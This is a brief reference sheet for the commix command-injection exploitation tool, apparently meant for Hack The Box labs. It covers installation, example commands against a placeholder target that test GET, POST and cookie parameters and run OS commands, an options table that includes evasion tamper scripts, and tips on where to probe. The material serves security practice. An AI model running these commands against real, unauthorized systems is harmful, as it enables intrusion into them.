# commix

## Purpose
Automated command injection exploitation tool. Tests for OS command injection vulnerabilities and provides interactive shells.

## Installation
```bash
sudo apt install commix
```

## Quick Start
```bash
# Test GET parameter
commix --url="http://target.htb/page?ip=127.0.0.1"

# Test POST parameter
commix --url="http://target.htb/page" --data="ip=127.0.0.1"

# With cookie
commix --url="http://target.htb/page?cmd=id" --cookie="session=abc"

# Specify injection point
commix --url="http://target.htb/page" --data="ip=INJECT_HERE&submit=go"

# Get pseudo-interactive shell
commix --url="http://target.htb/page?ip=127.0.0.1" --os-cmd="id"
```

## Key Options
| Option | Description |
|--------|-------------|
| `--url` | Target URL |
| `--data` | POST data |
| `--cookie` | Cookie string |
| `--os-cmd` | Execute single OS command |
| `--level` | Test level 1-3 |
| `--technique` | c(lassic), e(val), t(ime-based) |
| `--batch` | Auto-answer prompts |
| `--tamper` | Tamper scripts for evasion |

## HTB Usage
- Test any parameter that might interact with OS commands (ping, traceroute, DNS tools)
- Common in boxes with web-based system administration panels
- Try when you see commands like `ping`, `nslookup`, `traceroute` in web UI
